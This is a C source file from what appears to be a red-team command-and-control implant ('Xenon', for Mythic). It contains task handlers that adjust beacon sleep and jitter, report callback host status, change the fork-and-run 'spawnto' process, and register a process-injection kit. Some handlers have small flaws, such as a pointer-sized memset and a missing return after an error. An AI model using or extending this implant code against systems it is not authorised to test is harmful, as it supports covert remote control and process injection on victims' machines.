/*
 * Contains misc agent tasks that do not necessitate their own file.
*/
#include "Tasks/Agent.h"

#include "Xenon.h"
#include "Parser.h"
#include "Strategy.h"
#include "Config.h"

/** 
 * Update the sleep & jitter timers for global Xenon instance.
*/ 
VOID AgentSleep(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);

    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    xenonConfig->sleeptime  = ParserGetInt32(arguments);
    xenonConfig->jitter     = ParserGetInt32(arguments);
    
    // Success
    PackageComplete(taskUuid, NULL);
}

/**
 * List Agents Current Connection host info
 */
VOID AgentStatus(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    PPackage data = PackageInit(0, NULL);

    PCALLBACK_NODE current = xenonConfig->CallbackDomainHead;  // Start at head
    int count = 0;
    while (current) {  // Loop while the current node is not NULL
        count++;
        PackageAddFormatPrintf(data, FALSE, "%s:%d -> %s%s\n",
                            current->hostname, current->port,
                            current->isDead ? "DEAD" : "ALIVE",
                        current == xenonConfig->CallbackDomains ? "\t(current)" : "");

        current = current->next;  // Move to the next node
    }

    // Success
    PackageComplete(taskUuid, data);

    // Cleanup
    PackageDestroy(data);
}




#ifdef INCLUDE_CMD_SPAWNTO
/**
 * Update spawnto process path
 */
VOID AgentSpawnto(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);
    if (nbArg == 0)
    {
        return;
    }

    SIZE_T newLen  = 0;
    PCHAR previous = xenonConfig->spawnto;
    PCHAR new      = ParserStringCopy(arguments, &newLen);
    
    if (new == NULL || newLen == 0)
    {
        _err("Failed to update spawnto process");
        PackageError(taskUuid, 0);
    }
    
    // Update spawnto path
    xenonConfig->spawnto = new;

    _dbg("Updated Xenon SPAWNTO \"%s\"", xenonConfig->spawnto);

    // Cleanup previous spawnto path
    memset(previous, '\0', sizeof(previous));
    LocalFree(previous);
    
    // Success
    PackageComplete(taskUuid, NULL);
}

#endif  //INCLUDE_CMD_SPAWNTO




#ifdef INCLUDE_CMD_REGISTER_PROCESS_INJECT_KIT
/**
 * Update process inject kit.
 * A UUID string is set in the global Xenon instance which represents a file on the Mythic server.
 */
VOID AgentRegisterProcessInjectKit(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
#define TASK_UUID_SIZE      36

    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);
    if (nbArg == 0)
        return;

    SIZE_T uuidLen        = 0;
    SIZE_T uuidLen2       = 0;
    BOOL isCustomKit      = (BOOL)ParserGetInt32(arguments);
    PCHAR  injectKitSpawn = NULL;
    PCHAR  injectKitExplicit = NULL;
    if (isCustomKit) {
        _dbg("[+] Registering Custom Process Injection Kit.")
        injectKitSpawn = ParserGetString(arguments, &uuidLen);        // Mythic file UUID for BOF
        
        // if (nbArg > 2)
        //     injectKitExplicit = ParserGetString(arguments, &uuidLen2);
    }
    else {
        goto END;
    }

    // TODO - There is another file UUID for PROCESS_INJECT_EXPLICIT hook, but we not implementing that yet...

    if (injectKitSpawn == NULL || uuidLen == 0)
    {
        _err("Failed to parse file uuid process");
        PackageError(taskUuid, 0);
    }
    
    // Replace UUID to BOF for fork & run injection
    strncpy(xenonConfig->injectKitSpawn, injectKitSpawn, TASK_UUID_SIZE + 1);

    _dbg("Updated Xenon PROCESS_INJECT_SPAWN to MythicFile: %s", xenonConfig->injectKitSpawn);
    
END:
    // Success
    PackageComplete(taskUuid, NULL);
}

#endif //INCLUDE_CMD_REGISTER_PROCESS_INJECT_KIT